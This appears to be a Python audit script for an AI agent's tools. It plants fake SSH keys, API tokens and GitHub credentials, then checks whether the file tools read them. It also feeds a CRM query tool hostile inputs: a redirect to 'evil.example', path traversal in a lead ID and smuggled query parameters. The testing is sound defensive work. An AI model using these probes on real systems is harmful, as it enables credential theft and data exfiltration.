exec(open(__import__("os").path.join(__import__("os").path.dirname(__import__("os").path.realpath(__file__)),"h.py")).read())
H=B+"/home"
os.makedirs(H+"/.ssh",exist_ok=True); os.makedirs(H+"/.codeyOS",exist_ok=True); os.makedirs(H+"/.config/gh",exist_ok=True)
open(H+"/.env","w").write("OPENROUTER_API_KEY=FAKE-ENVFILE-KEY\n")
open(H+"/.ssh/id_rsa","w").write("FAKE-PRIVATE-KEY\n")
open(H+"/.netrc","w").write("machine x login y password FAKE-NETRC\n")
open(H+"/.codeyOS/age.key","w").write("AGE-SECRET-KEY-FAKE\n")
open(H+"/.codeyOS/aigentik_internal_token","w").write("FAKE-INTERNAL\n")
open(H+"/.codeyOS/ccos_crm_read_token","w").write("FAKE-CRM-READ-TOKEN\n")
open(H+"/.config/gh/hosts.yml","w").write("github.com:\n  oauth_token: FAKE-GH\n")
os.chdir(H)   # workspace = HOME (WORKSPACE_ROOT = cwd at import)
install_fakes()
from tools.file_tools import tool_read_file
import utils.config as C
print("WORKSPACE_ROOT",C.WORKSPACE_ROOT)
for rel in [".env",".ssh/id_rsa",".netrc",".codeyOS/age.key",".codeyOS/aigentik_internal_token",".config/gh/hosts.yml"]:
    print("F",rel,"->",repr(tool_read_file(rel))[:100])
from tools.file_tools import tool_list_dir
print("F list_dir:",tool_list_dir(".")[:300].replace("\n"," | "))
from core.context import is_ignored
print("F is_ignored(.env):",is_ignored(H+"/.env"), "(the ignore check exists in core.context.load_file only)")
# (h) crm smuggling
import requests
REC=[]
def fake_get(self,url,headers=None,params=None,timeout=None,**k):
    REC.append((url,dict(headers or {}),params)); 
    class R: status_code=200; text="{}"
    r=R(); r.json=lambda: {"leads":[]}; return r
requests.Session.get=fake_get
from core.agent import tool_crm_query
tests=[{"kind":"list_leads","host":"evil.example","port":1,"token":"x","base_url":"http://evil.example","status":"new"},
       {"kind":"get_lead","lead_id":"1/../../users"},
       {"kind":"get_lead","lead_id":"1"},
       {"kind":"list_customers","search":"a&limit=1000000&offset=-1","limit":99999999}]
for t in tests:
    REC.clear(); out=tool_crm_query(t)
    print("H",t,"->",out[:100],"| recorded:",[(u,h.get("Authorization","")[:14],p) for u,h,p in REC])
